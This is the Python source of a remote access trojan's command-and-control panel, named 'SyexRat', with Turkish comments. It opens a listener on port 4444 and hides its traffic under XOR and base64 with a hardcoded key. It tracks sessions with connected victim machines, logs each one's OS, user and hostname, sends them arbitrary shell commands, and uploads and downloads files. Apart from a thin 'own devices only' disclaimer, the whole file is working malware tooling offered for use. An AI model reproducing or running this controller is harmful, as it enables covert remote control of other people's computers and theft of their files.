#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SyexRat - Controller / Panel
Kendi cihazlarınız arasındaki test için.
"""

import socket
import threading
import base64
import json
import os
import sys

HOST = "0.0.0.0"
PORT = 4444
KEY = b"SyexSecretKey2026"   # client ile AYNI olmalı!

sessions = {}          # {id: (conn, addr, sysinfo)}
session_counter = 0
lock = threading.Lock()


def xor_crypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def encode_packet(data: bytes) -> bytes:
    enc = base64.b64encode(xor_crypt(data, KEY))
    return len(enc).to_bytes(4, 'big') + enc


def recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Baglanti kesildi")
        buf += chunk
    return buf


def decode_packet(sock: socket.socket) -> bytes:
    length = int.from_bytes(recv_exact(sock, 4), 'big')
    return xor_crypt(base64.b64decode(recv_exact(sock, length)), KEY)


def handle_client(conn: socket.socket, addr):
    global session_counter
    try:
        sysinfo = json.loads(decode_packet(conn).decode())
    except Exception:
        conn.close()
        return

    with lock:
        global session_counter
        session_counter += 1
        sid = session_counter
        sessions[sid] = (conn, addr, sysinfo)

    print(f"\n[+] Yeni baglanti #{sid}: {addr[0]} | {sysinfo['os']} | "
          f"user={sysinfo['user']} | host={sysinfo['hostname']}")
    print("syex> ", end="", flush=True)


def interactive(sid: int):
    with lock:
        if sid not in sessions:
            print("[-] Boyle bir oturum yok.")
            return
        conn, addr, sysinfo = sessions[sid]

    print(f"\n[*] Oturum #{sid} ({addr[0]}) - komut yazin, 'back' ile donun")
    print(f"[*] Ozel komutlar: sysinfo, ping, download <dosya>, "
          f"upload <dosya>, cd <dizin>, exit\n")

    while True:
        try:
            cmd = input(f"#{sid} {sysinfo['user']}@{sysinfo['hostname']}$ ").strip()
        except (EOFError, KeyboardInterrupt):
            cmd = "back"

        if not cmd:
            continue
        if cmd == "back":
            return

        try:
            conn.sendall(encode_packet(cmd.encode()))
        except OSError:
            print("[-] Baglanti koptu.")
            with lock:
                sessions.pop(sid, None)
            return

        # Dosya transfer kontrolü
        if cmd.startswith("upload "):
            # server -> client dosya gönder
            filepath = cmd[7:].strip()
            if not os.path.isfile(filepath):
                print(f"[-] Dosya yok: {filepath}")
                # dummy packet gonder ki client tarafini kilitleme
                conn.sendall(encode_packet(b"__CANCEL__"))
                continue
            try:
                size = os.path.getsize(filepath)
                meta = json.dumps({"file": os.path.basename(filepath), "size": size}).encode()
                conn.sendall(encode_packet(b"__FILE__" + meta))
                with open(filepath, 'rb') as f:
                    while True:
                        chunk = f.read(65536)
                        if not chunk:
                            break
                        conn.sendall(encode_packet(chunk))
                print(f"[+] Gonderildi: {filepath}")
            except Exception as e:
                print(f"[-] Hata: {e}")
            # client'tan sonuc bekle
            print("    " + decode_packet(conn).decode(errors="replace"))
            continue

        if cmd.startswith("download "):
            # client dosyayi gonderir; once metadata bekle
            raw = decode_packet(conn)
            if raw.startswith(b"__FILE__"):
                meta = json.loads(raw[8:])
                filename = meta["file"]
                received = 0
                try:
                    with open(filename, 'wb') as f:
                        while received < meta["size"]:
                            chunk = decode_packet(conn)
                            f.write(chunk)
                            received += len(chunk)
                    print(f"[+] Indirildi: {filename} ({received} bayt)")
                except Exception as e:
                    print(f"[-] Indirme hatasi: {e}")
                # client'in son mesajini da oku (durum raporu)
            try:
                print("    " + decode_packet(conn).decode(errors="replace"))
            except ConnectionError:
                pass
            continue

        # Normal komut çıktısı
        try:
            out = decode_packet(conn).decode("utf-8", errors="replace")
            print(out)
        except (ConnectionError, OSError):
            print("[-] Baglanti koptu.")
            with lock:
                sessions.pop(sid, None)
            return


def list_sessions():
    with lock:
        if not sessions:
            print("[*] Aktif oturum yok.")
            return
        print(f"\n  {'ID':<4} {'IP':<18} {'OS':<12} {'Kullanici':<15} {'Host':<15}")
        print("  " + "-" * 60)
        for sid, (_, addr, info) in sessions.items():
            print(f"  {sid:<4} {addr[0]:<18} {info['os']:<12} "
                  f"{info['user']:<15} {info['hostname']:<15}")
    print()


def command_loop():
    while True:
        try:
            cmd = input("syex> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Cikiliyor...")
            with lock:
                for sid, (conn, _, _) in sessions.items():
                    try:
                        conn.sendall(encode_packet(b"exit"))
                        conn.close()
                    except Exception:
                        pass
            sys.exit(0)

        if cmd == "sessions":
            list_sessions()
        elif cmd.startswith("use "):
            try:
                interactive(int(cmd[4:].strip()))
            except ValueError:
                print("[-] Kullanim: use <oturum_id>")
        elif cmd == "help":
            print("  sessions        - oturumlari listele")
            print("  use <id>        - oturuma baglan")
            print("  exit            - tum oturumlari kapat ve cik")
        elif cmd == "exit":
            with lock:
                for sid, (conn, _, _) in sessions.items():
                    try:
                        conn.sendall(encode_packet(b"exit"))
                        conn.close()
                    except Exception:
                        pass
            sys.exit(0)
        else:
            print("[?] 'help' yazin.")


def main():
    print("=" * 50)
    print("  SyexRat Controller - Sadece kendi cihazlariniz icin")
    print("=" * 50)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
    except OSError as e:
        print(f"[-] Port acilamadi ({PORT}): {e}")
        sys.exit(1)

    print(f"[*] Dinleniyor: {HOST}:{PORT}\n")

    threading.Thread(target=command_loop, daemon=True).start()

    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
